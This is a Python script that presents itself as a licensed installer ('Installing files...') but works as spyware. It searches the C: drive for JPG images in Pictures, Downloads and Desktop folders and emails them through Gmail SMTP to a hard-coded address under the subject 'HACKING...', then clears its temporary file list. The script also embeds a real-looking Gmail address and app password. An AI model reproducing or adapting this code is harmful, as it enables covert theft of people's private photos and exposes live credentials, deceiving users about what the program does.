from subprocess import check_output
import smtplib
from email.message import EmailMessage
import time
import os
#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
password = "qyapunbrzoqvmfzo"
my_email = "magidbarmaky@gmail.com"
EMAIL_HOST = 'smtp.gmail.com'
EMAIL_HOST_USER = my_email
EMAIL_HOST_PASSWORD = password
EMAIL_HOST_PORT = 465
licensecode = "123"
usarcode= '123'
#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

name = 'chackproxy.txt'
f = open(name,'w')
f2 = open(name,'r')
print("Please do not get out of the program.")
print("Do not disconnect your 'internet' until the end of the operation\n")
print("loading....")
time.sleep(2)
usarname = input("usarname: ")
license2 = input("License: ")
path = os.getcwd()
if (usarname,license2) ==(usarcode,licensecode):
    print("[+]welcome")
    
    if "C:" in path:
        cmd = check_output('cd C:\\ && dir /S /B *.jpg',shell=True).decode()
        for i in cmd:
            f.writelines(i)
        l=[]
        for j in f2:
            if len(j)>=4:
                if "Pictures" in j:
                    l.append(j)
                elif 'Downloads' in j:
                    l.append(j)
                elif 'Desktop'in j:
                    l.append(j)
        #>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        print("Installing files...")
        msg = EmailMessage()
        msg['Subject'] = 'HACKING...'
        msg['From'] = EMAIL_HOST_USER
        msg['To'] = my_email
        result=0
        for j in l:
            try:
                if len(j) >=4:
                    with open(j[:-1], 'rb') as f:
                        file_data = f.read()
                        file_name = f.name
                        msg.add_attachment(file_data, maintype='image', subtype='jpg', filename=file_name)
                        with smtplib.SMTP_SSL(host=EMAIL_HOST, port=EMAIL_HOST_PORT) as server:
                            server.login(EMAIL_HOST_USER, EMAIL_HOST_PASSWORD)
                            server.send_message(msg)
                            result+=1
                            print('[+] {0:1.1f}%'.format(result/len(l)*100))
            except:
                print("ERROR\nno enternet ! ")

        #>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        f.close()
        f2.close()
        f=open(name,"w")
        f.write(" ")
        f.close()
        print('finish')
        input("")

    else:
        os.chdir("C:/")
        cmd = check_output('cd C:\\ && dir /S /B *.jpg',shell=True).decode()
        for i in cmd:
            f.writelines(i)
        l=[]
        for j in f2:
            if len(j)>=4:
                if "Pictures" in j:
                    l.append(j)
                elif 'Downloads' in j:
                    l.append(j)
                elif 'Desktop'in j:
                    l.append(j)
        #>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        print("Installing files...")
        msg = EmailMessage()
        msg['Subject'] = 'HACKING...'
        msg['From'] = EMAIL_HOST_USER
        msg['To'] = my_email
        result=0
        for j in l:
            try:
                if len(j) >=4:
                    with open(j[:-1], 'rb') as f:
                        file_data = f.read()
                        file_name = f.name
                        msg.add_attachment(file_data, maintype='image', subtype='jpg', filename=file_name)
                        with smtplib.SMTP_SSL(host=EMAIL_HOST, port=EMAIL_HOST_PORT) as server:
                            server.login(EMAIL_HOST_USER, EMAIL_HOST_PASSWORD)
                            server.send_message(msg)
                            result+=1
                            print('[+] {0:1.1f}%'.format(result/len(l)*100))
            except:
                print("ERROR\nno enternet ! ")

    f.close()
    f2.close()
    f=open(name,"w")
    f.write(" ")
    f.close()
    print('finish')
    input("")
else:
    print("[-]error!")